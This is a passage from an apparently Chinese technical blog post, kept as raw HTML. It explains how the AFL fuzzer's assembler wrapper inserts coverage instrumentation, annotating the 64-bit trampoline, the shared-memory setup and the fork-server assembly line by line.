punctuation">&#123;</span><span class="token comment">//如果当前是指令行且满足插桩条件</span>      <span class="token function">fprintf</span><span class="token punctuation">(</span>outf<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> trampoline_fmt_64 <span class="token operator">:</span> trampoline_fmt_32<span class="token punctuation">,</span> <span class="token function">R</span><span class="token punctuation">(</span>MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//插入插桩代码</span>      instrument_next <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//instrument_next 标志清零，表示当前行已经插入插桩代码</span>      ins_lines<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//插桩计数器增加</span>    <span class="token punctuation">&#125;</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> outf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//插入插桩代码后将当前行插入</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pass_thru<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\t'</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//当前行以 \t.开头</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>clang_mode <span class="token operator">&amp;&amp;</span> instr_ok <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"p2align "</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>          <span class="token function">isdigit</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span> skip_next_label <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"text\n"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section\t.text"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section\t__TEXT,__text"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section __TEXT,__text"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        instr_ok <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token comment">//在 \t.text\n, \t.section\t.text, \t.section\t__TEXT,__text, \t.section __TEXT, __text 中则设置 instr_ok 为 1</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section\t"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"section "</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"bss\n"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">||</span>          <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"data\n"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        instr_ok <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token comment">//在 \t.section\t, \t.section, \t.bss\n, \t.data\n 中则设置 instr_ok 为 0</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".code"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".code32"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_csect <span class="token operator">=</span> use_64bit<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".code64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_csect <span class="token operator">=</span> <span class="token operator">!</span>use_64bit<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//根据程序是 32 位还是 64 位设置 skip_csect</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".intel_syntax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_intel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//检测到 .intel_syntax，表示进入 Intel 语法模式，跳过插桩</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">".att_syntax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_intel <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//检测到 .att_syntax，表示回到 AT&amp;T 语法模式，恢复插桩</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'#'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'#'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"#APP"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_app <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">"#NO_APP"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> skip_app <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//检测到 #APP 则跳过插桩，检测到 #NO_APP 则恢复插桩</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>skip_intel <span class="token operator">||</span> skip_app <span class="token operator">||</span> skip_csect <span class="token operator">||</span> <span class="token operator">!</span>instr_ok <span class="token operator">||</span>        line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'#'</span> <span class="token operator">||</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">' '</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//存在需要跳过的条件则跳过该行</span>    <span class="token comment">//条件分支指令（jnz 等）。我们将检测附加到分支之后（用于检测未采用的路径）和分支目标标签（稍后处理）</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\t'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'j'</span> <span class="token operator">&amp;&amp;</span> line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token char">'m'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">R</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> inst_ratio<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//条件跳转指令且满足插桩概率则插桩，非条件跳转例如 jmp 不会插桩</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span>outf<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> trampoline_fmt_64 <span class="token operator">:</span> trampoline_fmt_32<span class="token punctuation">,</span> <span class="token function">R</span><span class="token punctuation">(</span>MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ins_lines<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    <span class="token comment">/* Everybody else: .L&lt;whatever>: */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//检测分支目标标签，例如 .L0:</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>        <span class="token comment">/* .L0: or LBB0_0: style jump destination */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__APPLE__</span></span>       <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>        <span class="token comment">/* Apple: .L&lt;num> / .LBB&lt;num> */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>clang_mode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"LBB"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">R</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> inst_ratio<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//.?n: 或 clang 模式下 .LBB 且满足插桩概率</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">/* __APPLE__ */</span></span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>skip_next_label<span class="token punctuation">)</span> instrument_next <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果未设置 skip_next_label ，标签符合插桩条件，则设置 instrument_next = 1，表示在下一条指令插入插桩代码</span>          <span class="token keyword">else</span> skip_next_label <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//否则设置 skip_next_label 为 0</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/* Function label (always instrumented, deferred mode). */</span>        instrument_next <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//有冒号，不是分支目标标签，则是函数入口点标签，在下一条进行插桩</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>ins_lines<span class="token punctuation">)</span>    <span class="token function">fputs</span><span class="token punctuation">(</span>use_64bit <span class="token operator">?</span> main_payload_64 <span class="token operator">:</span> main_payload_32<span class="token punctuation">,</span> outf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据程序位数插入 main_payload_64 / main_payload_32</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>input_file<span class="token punctuation">)</span> <span class="token function">fclose</span><span class="token punctuation">(</span>inf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>outf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>be_quiet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ins_lines<span class="token punctuation">)</span> <span class="token function">WARNF</span><span class="token punctuation">(</span><span class="token string">"No instrumentation targets found%s."</span><span class="token punctuation">,</span> pass_thru <span class="token operator">?</span> <span class="token string">" (pass-thru mode)"</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token function">OKF</span><span class="token punctuation">(</span><span class="token string">"Instrumented %u locations (%s-bit, %s mode, ratio %u%%)."</span><span class="token punctuation">,</span>             ins_lines<span class="token punctuation">,</span> use_64bit <span class="token operator">?</span> <span class="token string">"64"</span> <span class="token operator">:</span> <span class="token string">"32"</span><span class="token punctuation">,</span>             <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_HARDEN"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"hardened"</span> <span class="token operator">:</span>              <span class="token punctuation">(</span>sanitizer <span class="token operator">?</span> <span class="token string">"ASAN/MSAN"</span> <span class="token operator">:</span> <span class="token string">"non-hardened"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>             inst_ratio<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插桩汇编代码"><a href="#插桩汇编代码" class="headerlink" title="插桩汇编代码"></a>插桩汇编代码</h3><p>trampoline_fmt_32 和 main_payload_32 见源码</p><p>trampoline_fmt_64：</p><ul><li>保存寄存器的值</li><li>将当前的代码位置加载到 rcx 寄存器</li><li>调用 __afl_maybe_log</li><li>恢复寄存器的值</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">static const u8* trampoline_fmt_64 &#x3D;  &quot;\n&quot;  &quot;&#x2F;* --- AFL TRAMPOLINE (64-BIT) --- *&#x2F;\n&quot;  &quot;\n&quot;  &quot;.align 4\n&quot;  &quot;\n&quot;  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;  &quot;movq %%rdx,  0(%%rsp)\n&quot;  &quot;movq %%rcx,  8(%%rsp)\n&quot;  &quot;movq %%rax, 16(%%rsp)\n&quot;;保存寄存器的值  &quot;movq $0x%08x, %%rcx\n&quot;;将当前的代码位置加载到 rcx 寄存器，%08x 是一个格式化占位符，表示一个 8 位的十六进制数  &quot;call __afl_maybe_log\n&quot;;调用 __afl_maybe_log 将当前的执行路径信息记录到共享内存中  &quot;movq 16(%%rsp), %%rax\n&quot;  &quot;movq  8(%%rsp), %%rcx\n&quot;  &quot;movq  0(%%rsp), %%rdx\n&quot;  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;;恢复寄存器的值  &quot;\n&quot;  &quot;&#x2F;* --- END --- *&#x2F;\n&quot;  &quot;\n&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>main_payload_64：</p><ul><li><p>入口点：__afl_maybe_log</p><ul><li>获取共享内存指针，未初始化则跳转到 __afl_setup 进行初始化</li><li>跳转到 __afl_store</li></ul></li><li><p>路径记录逻辑：__afl_store - 计算前一个基本块（pre_location）到当前基本块（cur_location）这条边的ID，然后统计其出现次数</p><ul><li>计算并存储 rcx 中指定的代码位置的命中率</li><li>将上一个代码位置右移一位（优化存储）</li><li>将计算结果存储到共享内存中</li></ul></li><li><p>初始化共享内存：__afl_setup - 获取AFL进程设置的共享内存标识符，并在target进程内attach到共享内存</p><ul><li>获取 __afl_setup_failure 判断是否已经进行过初始化并且失败，已经失败过就跳转到 __afl_return 进行返回避免重复初始化</li><li>如果全局共享内存指针已设置，直接跳转到 __afl_store</li><li>如果未设置，跳转到 __afl_setup_first 进行第一次初始化，调用后从 rdx 寄存器获取 __afl_setup_abort</li></ul></li><li><p>第一次初始化共享内存：__afl_setup_first</p><ul><li>将寄存器的值保存到栈上</li><li>获取环境变量中的共享内存 ID 并且转换成整数</li><li>使用 shmat 将共享内存映射到当前进程，如果失败跳转到 __afl_setup_abort</li><li>将全局共享内存地址存储到 __afl_global_area_ptr，将共享内存地址存储到  __afl_global_area_ptr 地址中，并且存放到 rdx 中</li></ul></li><li><p>初始化失败处理：__afl_setup_abort</p><ul><li>增加 __afl_setup_failure 的值</li><li>从栈上恢复所有寄存器</li><li>跳转到 __afl_return：返回主逻辑</li></ul></li><li><p>处理异常情况：__afl_die 退出程序</p></li><li><p>恢复标志寄存器状态并返回：__afl_return</p></li><li><p>Fork Server 模式：__afl_forkserver，通过 Fork Server 模式避免频繁调用 execve，提升 fuzz 效率</p><ul><li>通知父进程：向父进程发送一个信号，表示当前进程已准备好</li><li>等待父进程指令：通过管道从父进程读取指令。如果读取失败，跳转到 __afl_die</li><li>创建子进程：<ul><li>使用 fork 创建子进程。如果失败，跳转到 __afl_die</li><li>子进程跳转到 __afl_fork_resume，父进程继续执行</li></ul></li><li>父进程逻辑：<ul><li>父进程将子进程的 PID 写入管道</li><li>父进程调用 waitpid 等待子进程执行完毕</li><li>父进程将子进程的退出状态写入管道，然后回到 __afl_fork_wait_loop</li></ul></li></ul></li><li><p>通过读取管道等待父进程：__afl_fork_wait_loop</p><ul><li>父进程通过管道（文件描述符 FORKSRV_FD）接收 AFL Fuzzer 的指令</li><li>父进程调用 fork 创建子进程</li><li>父进程将子进程的 PID 写入管道，并等待子进程执行完</li><li>父进程将子进程的退出状态写入管道，然后返回到等待 AFL Fuzzer 的指令</li><li>子进程关闭管道文件描述符后，继续执行目标程序</li></ul></li><li><p>子进程恢复执行：__afl_fork_resume</p><ul><li>关闭管道文件描述符</li><li>恢复寄存器的值</li><li>跳转到 __afl_store</li></ul></li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">static const u8* main_payload_64 &#x3D;   &quot;\n&quot;  &quot;&#x2F;* --- AFL MAIN PAYLOAD (64-BIT) --- *&#x2F;\n&quot;  &quot;\n&quot;  &quot;.text\n&quot;  &quot;.att_syntax\n&quot;  &quot;.code64\n&quot;  &quot;.align 8\n&quot;  &quot;\n&quot;  &quot;__afl_maybe_log:\n&quot;  &quot;\n&quot;#if defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))  &quot;  .byte 0x9f &#x2F;* lahf *&#x2F;\n&quot;#else  &quot;  lahf\n&quot;#endif &#x2F;* ^__OpenBSD__, etc *&#x2F;  &quot;  seto  %al\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* Check if SHM region is already mapped. *&#x2F;\n&quot;;检查共享内存区域是否已经映射  &quot;\n&quot;  &quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;;获取共享内存区域 __afl_area_ptr 地址  &quot;  testq %rdx, %rdx\n&quot;  &quot;  je    __afl_setup\n&quot;;如果__afl_area_ptr 为零即尚未映射，则调用 __afl_setup 函数进行初始化  &quot;\n&quot;  &quot;__afl_store:\n&quot;;路径记录逻辑  &quot;\n&quot;  &quot;  &#x2F;* Calculate and store hit for the code location specified in rcx. *&#x2F;\n&quot;;计算并存储 rcx 中指定的代码位置的命中率  &quot;\n&quot;#ifndef COVERAGE_ONLY  &quot;  xorq __afl_prev_loc(%rip), %rcx\n&quot;;rcx &#x3D; rcx ^ __afl_prev_loc  &quot;  xorq %rcx, __afl_prev_loc(%rip)\n&quot;;__afl_prev_loc &#x3D; 原 rcx 值  &quot;  shrq $1, __afl_prev_loc(%rip)\n&quot;;将上一个代码位置右移一位（优化存储）#endif &#x2F;* ^!COVERAGE_ONLY *&#x2F;  &quot;\n&quot;#ifdef SKIP_COUNTS;定义了是否仅记录命中次数（orb）还是累加命中次数（incb）  &quot;  orb  $1, (%rdx, %rcx, 1)\n&quot;;将计算结果存储到共享内存中，rdx &#x3D; __afl_area_ptr#else  &quot;  incb (%rdx, %rcx, 1)\n&quot;;将计算结果存储到共享内存中#endif &#x2F;* ^SKIP_COUNTS *&#x2F;  &quot;\n&quot;  &quot;__afl_return:\n&quot;;恢复标志寄存器的状态并返回  &quot;\n&quot;  &quot;  addb $127, %al\n&quot;;调整标志寄存器的状态#if defined(__OpenBSD__)  || (defined(__FreeBSD__) &amp;&amp; (__FreeBSD__ &lt; 9))  &quot;  .byte 0x9e &#x2F;* sahf *&#x2F;\n&quot;;将 ah 寄存器的内容加载到标志寄存器中（恢复标志寄存器的状态）#else  &quot;  sahf\n&quot;;将 ah 寄存器的内容加载到标志寄存器中（恢复标志寄存器的状态）#endif &#x2F;* ^__OpenBSD__, etc *&#x2F;  &quot;  ret\n&quot;;返回  &quot;\n&quot;  &quot;.align 8\n&quot;  &quot;\n&quot;  &quot;__afl_setup:\n&quot;;初始化共享内存  &quot;\n&quot;  &quot;  &#x2F;* Do not retry setup if we had previous failures. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;  &quot;  jne __afl_return\n&quot;;获取 __afl_setup_failure，如果上次 setup 失败则不再进行 setup，直接跳转到 __afl_return 返回  &quot;\n&quot;  &quot;  &#x2F;* Check out if we have a global pointer on file. *&#x2F;\n&quot;  &quot;\n&quot;#ifndef __APPLE__  ...#else  &quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;;加载全局共享内存指针#endif &#x2F;* !^__APPLE__ *&#x2F;  &quot;  testq %rdx, %rdx\n&quot;  &quot;  je    __afl_setup_first\n&quot;·;没有映射过全局共享内存指针就调用 __afl_setup_first 初始化  &quot;\n&quot;  &quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;;将 __afl_setup_first 得到的共享内存区域传递给 __afl_area_ptr  &quot;  jmp  __afl_store\n&quot; ;跳转回 __afl_store  &quot;\n&quot;  &quot;__afl_setup_first:\n&quot;;第一次初始化共享内存  &quot;\n&quot;  &quot;  &#x2F;* Save everything that is not yet saved and that may be touched by getenv() and several other libcalls we&#39;ll be relying on. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  leaq -352(%rsp), %rsp\n&quot;  &quot;\n&quot;  &quot;  movq %rax,   0(%rsp)\n&quot;  &quot;  movq %rcx,   8(%rsp)\n&quot;  &quot;  movq %rdi,  16(%rsp)\n&quot;  &quot;  movq %rsi,  32(%rsp)\n&quot;  &quot;  movq %r8,   40(%rsp)\n&quot;  &quot;  movq %r9,   48(%rsp)\n&quot;  &quot;  movq %r10,  56(%rsp)\n&quot;  &quot;  movq %r11,  64(%rsp)\n&quot;  &quot;\n&quot;  &quot;  movq %xmm0,  96(%rsp)\n&quot;  &quot;  movq %xmm1,  112(%rsp)\n&quot;  &quot;  movq %xmm2,  128(%rsp)\n&quot;  &quot;  movq %xmm3,  144(%rsp)\n&quot;  &quot;  movq %xmm4,  160(%rsp)\n&quot;  &quot;  movq %xmm5,  176(%rsp)\n&quot;  &quot;  movq %xmm6,  192(%rsp)\n&quot;  &quot;  movq %xmm7,  208(%rsp)\n&quot;  &quot;  movq %xmm8,  224(%rsp)\n&quot;  &quot;  movq %xmm9,  240(%rsp)\n&quot;  &quot;  movq %xmm10, 256(%rsp)\n&quot;  &quot;  movq %xmm11, 272(%rsp)\n&quot;  &quot;  movq %xmm12, 288(%rsp)\n&quot;  &quot;  movq %xmm13, 304(%rsp)\n&quot;  &quot;  movq %xmm14, 320(%rsp)\n&quot;  &quot;  movq %xmm15, 336(%rsp)\n&quot;;保存寄存器到栈上  &quot;\n&quot;  &quot;  &#x2F;* Map SHM, jumping to __afl_setup_abort if something goes wrong. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  &#x2F;* The 64-bit ABI requires 16-byte stack alignment. We&#39;ll keep the\n&quot;  &quot;     original stack ptr in the callee-saved r12. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  pushq %r12\n&quot;  &quot;  movq  %rsp, %r12\n&quot;  &quot;  subq  $16, %rsp\n&quot;  &quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;  &quot;\n&quot;  &quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;  CALL_L64(&quot;getenv&quot;);获取共享内存的 ID  &quot;\n&quot;  &quot;  testq %rax, %rax\n&quot;  &quot;  je    __afl_setup_abort\n&quot;  &quot;\n&quot;  &quot;  movq  %rax, %rdi\n&quot;  CALL_L64(&quot;atoi&quot;);ID转换成整数  &quot;\n&quot;  &quot;  xorq %rdx, %rdx   &#x2F;* shmat flags    *&#x2F;\n&quot;  &quot;  xorq %rsi, %rsi   &#x2F;* requested addr *&#x2F;\n&quot;  &quot;  movq %rax, %rdi   &#x2F;* SHM ID         *&#x2F;\n&quot;  CALL_L64(&quot;shmat&quot;);将共享内存映射到当前进程的地址空间  &quot;\n&quot;  &quot;  cmpq $-1, %rax\n&quot;  &quot;  je   __afl_setup_abort\n&quot;;如果失败，跳转到 __afl_setup_abort  &quot;\n&quot;  &quot;  &#x2F;* Store the address of the SHM region. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  movq %rax, %rdx\n&quot;  &quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;;将共享内存的地址存储到 __afl_area_ptr 中  &quot;\n&quot;#ifdef __APPLE__  ...#else  &quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;;全局共享内存指针赋值给 rdx  &quot;  movq %rax, (%rdx)\n&quot;;共享内存的地址存放到全局共享内存指针中#endif &#x2F;* ^__APPLE__ *&#x2F;  &quot;  movq %rax, %rdx\n&quot;;共享内存的地址给 rdx  &quot;\n&quot;  &quot;__afl_forkserver:\n&quot;;Fork Server 模式，避免重复调用 execve  &quot;\n&quot;  &quot;  &#x2F;* Enter the fork server mode to avoid the overhead of execve() calls. We\n&quot;  &quot;     push rdx (area ptr) twice to keep stack alignment neat. *&#x2F;\n&quot;  &quot;\n&quot;  &quot;  pushq %rdx\n&quot;  &quot;  pushq %rdx\n&quot;;保持栈平衡  